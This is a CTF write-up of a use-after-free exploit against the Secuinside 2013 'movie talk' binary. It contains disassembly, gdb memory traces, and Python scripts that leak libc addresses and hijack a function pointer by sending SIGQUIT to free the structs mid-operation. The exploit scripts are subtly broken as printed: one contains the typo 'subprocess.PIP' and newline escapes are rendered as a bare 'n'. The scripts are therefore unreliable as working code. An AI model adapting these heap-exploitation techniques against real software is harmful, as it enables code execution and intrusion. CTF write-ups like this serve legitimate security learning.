---
title: '[Secuinside CTF 2013] movie talk'
author: deroko
layout: post

aktt_notify_twitter:
  - no
shorturls:
  - 'a:0:{}'
tweetbackscheck:
  - 1408358959
kopa_newsmixlight_total_view:
  - 1
category: ctf - clgt crew
tags:
  - CLGT
  - CTF
  - exploit
  - use-after-free
---
Challenge itself is very interesting, as we have typical use-after-free problem. It&#8217;s running on Ubuntu 13.04 with NX + ASLR.

When we run challenge it gives us message as :

<pre class="brush: plain; title: ; notranslate" title="">######################################
#                                    #
#   Welcome to the movie talk show   #
#                                    #
######################################

1. movie addition
2. movie deletion
3. my movie list
4. quit
:
</pre>

movie addition is very straight forward:

<pre class="brush: plain; title: ; notranslate" title="">.text:080489F4                 mov     dword ptr [esp], 14h ; size
.text:080489FB                 call    _malloc
.text:08048A00                 mov     [ebp+movie_array], eax
.text:08048A03                 cmp     [ebp+movie_array], 0
.text:08048A07                 jnz     short __mem_alloc_ok
</pre>

Alloc struct to hold movie_list which is described like this:

<pre class="brush: plain; title: ; notranslate" title="">00000000 movie_list      struc ; (sizeof=0x14)
00000000 fn_moviedetails dd ?
00000004 movie_name      dd ?
00000008 movie_id        dd ?
0000000C movie_rating    dd ?
00000010 movie_rate      dd ?
</pre>

Than we have small sleep of 2 seconds here:

<pre class="brush: plain; title: ; notranslate" title="">.text:0804880A ; signed int __cdecl get_film_name_rating(movie_list a1)
.text:0804880A get_film_name_rating proc near
.text:0804880A                 push    ebp
.text:0804880B                 mov     ebp, esp
.text:0804880D                 sub     esp, 58h
.text:08048810                 mov     eax, [ebp+movie_array.fn_moviedetails]
.text:08048813                 mov     [ebp+l_movie_array], eax
.text:08048816                 mov     eax, large gs:14h
.text:0804881C                 mov     [ebp+cookie], eax
.text:0804881F                 xor     eax, eax
.text:08048821                 mov     dword ptr [esp], 2 ; seconds
.text:08048828                 call    _sleep   &lt;--- very important here is this sleep remember it for later
</pre>

than movie name is obtained from input:

<pre class="brush: plain; title: ; notranslate" title="">.text:0804882D                 mov     dword ptr [esp], offset aMovieName ; "movie name: "
.text:08048834                 call    _printf
.text:08048839                 mov     eax, ds:stdin
.text:0804883E                 mov     [esp+8], eax    ; stream
.text:08048842                 mov     dword ptr [esp+4], 1Eh ; n
.text:0804884A                 lea     eax, [ebp+nptr]
.text:0804884D                 mov     [esp], eax      ; s
.text:08048850                 call    _fgets
.text:08048855                 lea     eax, [ebp+nptr]
.text:08048858                 mov     [esp], eax      ; s
.text:0804885B                 call    _strlen
.text:08048860                 mov     [ebp+n], eax
.text:08048863                 mov     eax, [ebp+n]
.text:08048866                 add     eax, 1
.text:08048869                 mov     [esp], eax      ; size
.text:0804886C                 call    _malloc          &lt;--- malloc (also very important)
</pre>

Other code is not important, as it reads movie rating, which can be in range from 0-101 (although code says movie rating 1-100), not really important. Also application asks for movie_rate which can be in range:

<pre class="brush: plain; title: ; notranslate" title="">mov     dword ptr [esp], offset aFilmRate012151 ; "film rate [0,12,15,19]: "
</pre>

Than ID of movie is assigned which is it&#8217;s current place in array of movies, and not actual ID, and function to display movie is stored also as part of movie_list struct.

<pre class="brush: plain; title: ; notranslate" title="">.text:08048989                 mov     edx, ds:g_count_of_array
.text:0804898F                 mov     eax, [ebp+l_movie_array]
.text:08048992                 mov     [eax+movie_list.movie_id], edx
.text:08048995                 mov     eax, [ebp+l_movie_array]
.text:08048998                 mov     [eax+movie_list.fn_moviedetails], offset PutMovieDetails
.text:0804899E                 mov     eax, 1
</pre>

We noticed first that we can assign random ID to the movie, buy deleting them, and were looking at this code first. For example, when deleting movie this code is used to get it&#8217;s index:

<pre class="brush: plain; title: ; notranslate" title="">.text:08048AFB                 call    _fgets
.text:08048B00                 movzx   eax, [ebp+s]
.text:08048B04                 movsx   eax, al
.text:08048B07                 sub     eax, 31h
</pre>

Obviously, if we enter 10 it will always delete movie at index 0, as it considers only one char, thus we were looking where we can confuse program to reuse wrong index. Not good&#8230; nothing found. Code seemed like very well written, without errors. Every movie delete would fill gaps in array, thus code really seemed bullet-proof.

When code is about to exit, there was one function called, which would free whole array of movies:

<pre class="brush: plain; title: ; notranslate" title="">.text:08048C3B                 push    ebp
.text:08048C3C                 mov     ebp, esp
.text:08048C3E                 sub     esp, 28h
.text:08048C41                 mov     [ebp+index], 0
.text:08048C48                 jmp     short loc_8048C94
.text:08048C4A __loop_delete:
.text:08048C4A                 mov     eax, [ebp+index]
.text:08048C4D                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C54                 test    eax, eax
.text:08048C56                 jz      short __no_movie
.text:08048C58                 mov     eax, [ebp+index]
.text:08048C5B                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C62                 mov     eax, [eax+movie_list.movie_name]
.text:08048C65                 test    eax, eax
.text:08048C67                 jz      short __no_movie
.text:08048C69                 mov     eax, [ebp+index]
.text:08048C6C                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C73                 mov     eax, [eax+movie_list.movie_name]
.text:08048C76                 mov     [esp], eax      ; ptr
.text:08048C79                 call    _free
.text:08048C7E                 mov     eax, [ebp+index]
.text:08048C81                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C88                 mov     [esp], eax      ; ptr
.text:08048C8B                 call    _free
.text:08048C90
.text:08048C90 __no_movie:
.text:08048C90                 add     [ebp+index], 1
.text:08048C94
.text:08048C94 loc_8048C94:
.text:08048C94                 cmp     [ebp+index], 9
.text:08048C98                 jbe     short __loop_delete
.text:08048C9A                 leave
.text:08048C9B                 ret
</pre>

This function, would give us full control over arrays of movies, as we could free movies, and reuse freed memory to be used later during printing movie:

<pre class="brush: plain; title: ; notranslate" title="">.text:08048BFA                 mov     eax, [ebp+index]
.text:08048BFD                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C04                 test    eax, eax
.text:08048C06                 jz      short loc_8048C23
.text:08048C08                 mov     eax, [ebp+index]
.text:08048C0B                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C12                 mov     eax, [eax+movie_list.fn_moviedetails]
.text:08048C14                 mov     edx, [ebp+index]
.text:08048C17                 mov     edx, ds:g_movie_array.fn_moviedetails[edx*4]
.text:08048C1E                 mov     [esp], edx
.text:08048C21                 call    eax      &lt;-- if we free we could reuse movie.fn_moviedetails
 to execute our code.
</pre>

Than we saw something interesting:

<pre class="brush: plain; title: ; notranslate" title="">.text:08048CA5                 mov     dword ptr [esp+4], offset handler ; handler
.text:08048CAD                 mov     dword ptr [esp], 3 ; sig
.text:08048CB4                 call    _signal         ; SIGQUIT
</pre>

We can invoke free on all lists by sending signal 3 to the process, so we can actually free structs. When we run into it, in a few sec we had working poc:** @__suto** replied on skype : 0&#215;41414141 , and at the same time I replied with 0&#215;61616161 so we knew we have eip control. Now I&#8217;ll try to explain how we got to this point. We found also way to leak address of puts from GOT thus we can recalculate system address and call system(&#8220;cat key.txt&#8221;), as this point we handed POC to **xichzo** which soon got key, and we got 550 <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> 

Leaking address is something we didn&#8217;t manage to do, as application can&#8217;t be piped to receive data in real time, eg. pipe is flushed only when process dies, thus even if we leak address it wouldn&#8217;t be too much use, as on next run address would be different. So here we go for explanation of our use-after-free exploit:

Break after 1st malloc when adding movie:

<pre class="brush: plain; title: ; notranslate" title="">--------------------------------------------------------------------------[regs]
 EAX: 0x0804C008  EBX: 0xB7FC3000  ECX: 0xB7FC3440  EDX: 0x0804C008  o d I t S z a P c
 ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF178  ESP: 0xBFFFF150  EIP: 0x08048A00
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------1
=&gt; 0x8048a00:    mov    DWORD PTR [ebp-0x10],eax
 0x8048a03:    cmp    DWORD PTR [ebp-0x10],0x0
 0x8048a07:    jne    0x8048a15
 0x8048a09:    mov    DWORD PTR [esp],0x8048e93
 0x8048a10:    call   0x80486fc
 0x8048a15:    mov    eax,DWORD PTR [ebp-0x10]
 0x8048a18:    mov    DWORD PTR [esp],eax
 0x8048a1b:    call   0x804880a
--------------------------------------------------------------------------------

Breakpoint 1, 0x08048a00 in ?? ()
</pre>

Now comes sleep of 2 seconds, and we allocate 1st movie. This is very important to look at memory layout once 1st movie is added:

<pre class="brush: plain; title: ; notranslate" title="">gdb$ dd 0x804c008
[0x007B:0x0804C008]-------------------------------------------------------[data]
0x0804C008 : AA 87 04 08 20 C0 04 08 - 01 00 00 00 00 00 00 00 .... ...........
0x0804C018 : 00 00 00 00 19 00 00 00 - 61 61 61 61 61 61 61 61 ........aaaaaaaa
0x0804C028 : 61 61 61 61 61 61 0A 00 - 00 00 00 00 D1 0F 02 00 aaaaaa..........
0x0804C038 : 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00 ................
0x0804C048 : 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00 ................
0x0804C058 : 00 00 00 00 00 00 00 00 - 00 00 00 00 00 00 00 00 ................
</pre>

So movie_list is:

<pre class="brush: plain; title: ; notranslate" title="">00000000 fn_moviedetails        0x080487AA      &lt;--- display function
00000004 movie_name             0x0804C020      &lt;--- movie name
00000008 movie_id               0x1             &lt;--- index in global array of movies (not important)
0000000C movie_rating           0x0             &lt;--- dummy value which we set to be 0
00000010 movie_rate             0x0             &lt;--- dummy value which we set to be 0
</pre>

Lets observe memory when we allocate 2nd movie_list:

<pre class="brush: plain; title: ; notranslate" title="">EAX = 0x0804C038        &lt;--- right after our movie name string.
</pre>

Now when process goes into sleep(2) at :

<pre class="brush: plain; title: ; notranslate" title="">.text:08048821                 mov     dword ptr [esp], 2 ; seconds
.text:08048828                 call    _sleep
</pre>

We will fire killall -3 movie\_talk to free memory occupied by 1st movie\_list, and malloc for movie_name will be allocated here. To make it easier for debugging we can cheat by increasing timer to 32 sec:

<pre class="brush: plain; title: ; notranslate" title="">--------------------------------------------------------------------------[regs]
 EAX: 0x00000000  EBX: 0xB7FC3000  ECX: 0xB7FC3440  EDX: 0x0804C038  o d I t s Z a P c
 ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF148  ESP: 0xBFFFF0F0  EIP: 0x08048828
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------1
=&gt; 0x8048828:    call   0x8048550 &lt;sleep@plt&gt;
 0x804882d:    mov    DWORD PTR [esp],0x8048e86
 0x8048834:    call   0x8048500 &lt;printf@plt&gt;
 0x8048839:    mov    eax,ds:0x804b064
 0x804883e:    mov    DWORD PTR [esp+0x8],eax
 0x8048842:    mov    DWORD PTR [esp+0x4],0x1e
 0x804884a:    lea    eax,[ebp-0x2a]
 0x804884d:    mov    DWORD PTR [esp],eax
--------------------------------------------------------------------------------
0x08048828 in ?? ()
gdb$ break *0x804882d
Breakpoint 15 at 0x804882d
gdb$ set *(unsigned int *)$esp = 0x20
gdb$

...
=&gt; 0xb7fdd424 &lt;__kernel_vsyscall+16&gt;:    pop    ebp
 0xb7fdd425 &lt;__kernel_vsyscall+17&gt;:    pop    edx
 0xb7fdd426 &lt;__kernel_vsyscall+18&gt;:    pop    ecx
 0xb7fdd427 &lt;__kernel_vsyscall+19&gt;:    ret
</pre>

Signal fired, and we can continue:

<pre class="brush: plain; title: ; notranslate" title="">=&gt; 0x804882d:    mov    DWORD PTR [esp],0x8048e86
 0x8048834:    call   0x8048500 &lt;printf@plt&gt;
 </pre>

Now watch for malloc:

<pre class="brush: plain; title: ; notranslate" title="">--------------------------------------------------------------------------[regs]
 EAX: 0x0804C008  EBX: 0xB7FC3000  ECX: 0xB7FC3440  EDX: 0x0804C008  o d I t S z a P c
 ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF148  ESP: 0xBFFFF0F0  EIP: 0x08048871
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------1
=&gt; 0x8048871:    mov    edx,eax
 0x8048873:    mov    eax,DWORD PTR [ebp-0x3c]
 0x8048876:    mov    DWORD PTR [eax+0x4],edx
 0x8048879:    mov    eax,DWORD PTR [ebp-0x3c]
 0x804887c:    mov    eax,DWORD PTR [eax+0x4]
 0x804887f:    test   eax,eax
 0x8048881:    jne    0x804888f
 0x8048883:    mov    DWORD PTR [esp],0x8048e93
--------------------------------------------------------------------------------

Temporary breakpoint 20, 0x08048871 in ?? ()&lt;/pre&gt;
EAX = 0x804C008 &lt;--- where we had 1st movie list, thus we control movie_list and
function pointer at movie_list.fn_moviedetails
</pre>

Lets look at memory after input is copied there:

<pre class="brush: plain; title: ; notranslate" title="">gdb$ dd 0x804c008
[0x007B:0x0804C008]-------------------------------------------------------[data]
0x0804C008 : 61 61 61 61 61 61 61 61 - 61 61 61 61 61 61 61 61 aaaaaaaaaaaaaaaa
0x0804C018 : 0A 00 00 00 19 00 00 00 - 00 00 00 00 61 61 61 61 ............aaaa
0x0804C028 : 61 61 61 61 61 61 61 61 - 0A 00 00 00 19 00 00 00 aaaaaaaa........
0x0804C038 : 00 00 00 00 08 C0 04 08 - 00 00 00 00 00 00 00 00 ................
0x0804C048 : 00 00 00 00 B9 0F 02 00 - 00 00 00 00 00 00 00 00 ................
</pre>

Woops, 1st movie_lsit is overwriten, now we can list movies and watch how our  
data goes to 0x61616161:

<pre class="brush: plain; title: ; notranslate" title="">.text:08048BFA                 mov     eax, [ebp+index]
.text:08048BFD                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C04                 test    eax, eax
.text:08048C06                 jz      short loc_8048C23
.text:08048C08                 mov     eax, [ebp+index]
.text:08048C0B                 mov     eax, ds:g_movie_array.fn_moviedetails[eax*4]
.text:08048C12                 mov     eax, [eax+movie_list.fn_moviedetails]
.text:08048C14                 mov     edx, [ebp+index]
.text:08048C17                 mov     edx, ds:g_movie_array.fn_moviedetails[edx*4]
.text:08048C1E                 mov     [esp], edx
.text:08048C21                 call    eax

--------------------------------------------------------------------------[regs]
 EAX: 0x61616161  EBX: 0xB7FC3000  ECX: 0xB7FDA000  EDX: 0x0804C008  o d I t s z a p c
 ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFF178  ESP: 0xBFFFF150  EIP: 0x08048C21
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------1
=&gt; 0x8048c21:    call   eax
 0x8048c23:    add    DWORD PTR [ebp-0xc],0x1
</pre>

What is also important to notice here, is that movie list is pushed on stack, that means that stack layout is pointing to our controled buffer, so whatever we put into this movie_name, can be used as  argument for our code:

<pre class="brush: plain; title: ; notranslate" title="">gdb$ x/4wx $esp
0xbffff150:    0x0804c008    0x0000000c    0xb7fc3ac0    0xb7e13900
               ^^^^^^^^^^
                   |
                   +---- our controled input

</pre>

Address leak bonus, which was our 1st idea to get system address right away, was to leak puts address and do subtraction, unfortunately due to writing to pipe output would only come when pipe buffer is filled or process is terminated, so our idea didn't work, but for fun here is our code to leak puts address:

<pre class="brush: plain; title: ; notranslate" title="">gdb$ p puts-system
$1 = 0x26cf0
</pre>

<pre class="brush: plain; title: ; notranslate" title="">import time
import struct
import os
import subprocess

proc = subprocess.Popen("./movie_talk",
                        #shell=True,
                        stdin = subprocess.PIPE,
                        stdout = subprocess.PIP,
                        stderr = subprocess.PIPE);

payload = "1n" + "a" * 16 + "n0n0n"

#leak address of puts on ubuntu 13.04
payload += "1n";
payload += struct.pack("&lt;L", 0x80487aa);
payload += struct.pack("&lt;L", 0x804b030);
payload += struct.pack("&lt;L", 0x804b030);
payload += "n0n0n"
payload += "3n";
proc.stdin.write(payload);
time.sleep(3);
os.system("killall -3 movie_talk");
time.sleep(5);
proc.stdin.write("4n");
proc.wait();
buff = proc.stdout.read();
index = buff.find("movie id: 134524976");
index+=7;
index+=len("movie id: 134524976");
data = struct.unpack("&lt;L", buff[index:index+4]);
for x in data:
    print("puts address   : 0x%.08X" % x);
    print("system address : 0x%.08X" % (x-0x26cf0));
</pre>

and simple exploit to crash process (enable core dump):

<pre class="brush: plain; title: ; notranslate" title="">#!/usr/bin/env python
import  subprocess
import  time
import  os

proc = subprocess.Popen("./movie_talk",
                       shell=False,
                       stdin=subprocess.PIPE);

proc.stdin.write("1n" + "a"*16+"n"+"0n0n");
proc.stdin.write("1n" + "a"*16+"n"+"0n0n"); &lt;-- payload goes here
time.sleep(3);
os.system("killall -3 movie_talk");
proc.stdin.write("3n");
proc.stdin.write("4n");
proc.wait();

</pre>